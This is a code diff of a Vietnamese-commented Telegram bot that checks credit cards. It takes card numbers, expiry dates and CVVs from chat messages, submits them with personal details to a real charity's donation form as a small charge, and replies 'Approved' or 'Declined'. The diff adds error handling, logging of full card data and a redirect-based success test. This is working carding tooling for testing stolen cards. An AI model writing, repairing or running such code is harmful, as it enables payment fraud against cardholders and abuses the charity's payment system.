@@ -136,14 +136,15 @@ async def set_proxy(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(f"Proxy đã được thiết lập: {proxy}")
     # Lưu proxy vào file hoặc cấu hình nếu cần
 
-# Hàm xử lý tin nhắn
+# # Hàm xử lý tin nhắn
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_input = update.message.text
     card_info = extract_card_info(user_input)
 
     if not card_info:
-        return 
+        return
 
+    # Kiểm tra xem người dùng có được phép sử dụng hay không
     with open("allowed_users.txt", "r") as f:
         allowed_users = {int(line.strip()) for line in f.readlines()}
 
@@ -174,41 +175,76 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     start_time = time.time()
 
-    async with aiohttp.ClientSession() as session:
-        async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
-                                data={
-                                    'tfa_4': 'tfa_5',
-                                    'tfa_52': 'tfa_53',
-                                    'tfa_7': 'tfa_317',
-                                    'tfa_19': '1',
-                                    'tfa_20': '',
-                                    'tfa_21': name,
-                                    'tfa_23': 'Vu',
-                                    'tfa_27': phone,
-                                    'tfa_2276': zipcode,
-                                    'tfa_25': email,
-                                    'tfa_48': 'Web',
-                                    'tfa_50': 'tfa_50',
-                                    'tfa_59': cc,
-                                    'tfa_60': mes,
-                                    'tfa_70': ano,
-                                    'tfa_62': cvv,
-                                    'tfa_2273': 'G-BCL7XEG4WC',
-                                    'tfa_2274': 'GTM-WMPTRWL',
-                                    'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
-                                    'tfa_dbFormId': '151',
-                                    'tfa_dbResponseId': '',
-                                    'tfa_dbControl': '5bcf8e90bb74b882c8d9b8c4c51036be',
-                                }) as resp:
-            response_text = await resp.text()
-            elapsed_time = time.time() - start_time
+    # Logging để theo dõi dữ liệu gửi đi
+    logger.info(f"Sending data to API: Name: {name}, Phone: {phone}, Email: {email}, Zipcode: {zipcode}, Card: {cc}|{mes}|{ano}|{cvv}")
 
-            if "Approved" in response_text:
-                result = "Approved"
-                await update.message.reply_text(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: {result}\n𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
-            else:
-                result = extract_error_message(response_text)
-                await update.message.reply_text(f"Declined \n𝗖𝗮𝗿𝗱: {cc}|{mes}|{ano}|{cvv}\n𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$\n𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {result}\n𝗧𝗶𝗺𝗲: {elapsed_time:.2f} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬")
+    async with aiohttp.ClientSession() as session:
+        try:
+            async with session.post("https://anglicaresa.tfaforms.net/api_v2/workflow/processor",
+                                    data={
+                                        'tfa_4': 'tfa_5',
+                                        'tfa_52': 'tfa_53',
+                                        'tfa_7': 'tfa_317',
+                                        'tfa_19': '1',
+                                        'tfa_20': '',
+                                        'tfa_21': name,
+                                        'tfa_23': 'Vu',
+                                        'tfa_27': phone,
+                                        'tfa_2276': zipcode,
+                                        'tfa_25': email,
+                                        'tfa_48': 'Web',
+                                        'tfa_50': 'tfa_50',
+                                        'tfa_59': cc,
+                                        'tfa_60': mes,
+                                        'tfa_70': ano,
+                                        'tfa_62': cvv,
+                                        'tfa_2273': 'G-BCL7XEG4WC',
+                                        'tfa_2274': 'GTM-WMPTRWL',
+                                        'tfa_dbCounters': '785-2252e2e2bdb682ac1beba8ae3f2ff00e',
+                                        'tfa_dbFormId': '151',
+                                        'tfa_dbResponseId': '',
+                                        'tfa_dbControl': '5bcfe3f364f816d947749cc553596cff',
+                                        'tfa_dbWorkflowSessionUuid': '',
+                                        'tfa_dbTimeStarted': '1727426006',
+                                        'tfa_dbVersionId': '29',
+                                        'tfa_switchedoff': 'tfa_2270%2Ctfa_328'
+                                    }) as response:
+
+                elapsed_time = time.time() - start_time
+                elapsed_seconds = round(elapsed_time, 2)
+
+                # Thêm logging để theo dõi toàn bộ phản hồi từ API
+                response_text = await response.text()
+                logger.info(f"API Response: {response_text}")
+
+                final_url = str(response.url)
+                logger.info(f"Final URL: {final_url}")
+
+                if "https://anglicaresa.com.au/success/" in final_url:
+                    result_message = f"""𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
+
+𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: 1000: Approved
+𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
+                else:
+                    # Kiểm tra lỗi phản hồi và thêm vào logging
+                    error_message = extract_error_message(response_text)
+                    logger.error(f"Error in response: {error_message}")
+
+                    result_message = f"""Declined 
+
+𝗖𝗮𝗿𝗱: <code>{cc}|{mes}|{ano}|{cvv}</code> 
+𝐆𝐚𝐭𝐞𝐰𝐚𝐲: Stripe Charge 1$ 
+𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: {error_message if error_message else 'Unknown Error'}
+𝗧𝗶𝗺𝗲: {elapsed_seconds} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬"""
+
+                await update.message.reply_text(result_message, parse_mode="HTML")
+
+        except Exception as e:
+            logger.error(f"Error while making request: {e}")
+            await update.message.reply_text("Đã xảy ra lỗi khi gửi yêu cầu đến API.")
+
 
 # Hàm main
 async def main():
